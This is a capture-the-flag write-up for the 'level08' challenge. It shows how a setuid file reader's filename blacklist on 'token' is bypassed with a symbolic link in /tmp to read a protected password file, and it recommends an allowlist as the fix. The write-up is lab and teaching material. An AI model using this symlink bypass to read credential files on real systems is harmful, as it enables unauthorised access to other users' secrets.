# Security Vulnerability for Level08

The code only forbids the files with `token` word in filename, the blacklist system can be easily bypassed by changing filename(if user has the permission) or linking it to the other file that is not forbidden. It is better to use allowlist so only authorized files can be accessed, with appropriate permissions.

## Finding the Password for the `level09` User

### 1. Inspect the `/home/user/level08` Directory

There are 2 files in the directory:
```bash
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

### 2. Inspect `level08` Executable

The program requires 1 argument which is a file path. The program prints the file's contents to the STDOUT.

The `token` file must contain the password for the next level, but it is not possible to see its content:
```bash
./level08 token
You may not access 'token'
```

```bash
strings level08
```
Important part in the output is:
```bash
%s [file to read]
token
You may not access '%s'
```
So the string `token` is embedded in the executable, indicating that the program checks whether the filename contains `token`.

### 3. Bypass Source Code's Verification

We can't change name of file `token`, because `level08` has no permissions for that.
Make a symbolic link so we can execute `level08 file` with a filename that is not `token`.
It still will redirect to `token`.

```bash
ln -s /home/user/level08/token /tmp/my_file
./level08 /tmp/my_file
```

It prints the password for the `flag08` user.

### 4. Get the Password for the Next Level

Use the getflag command to retrieve the password for the next level.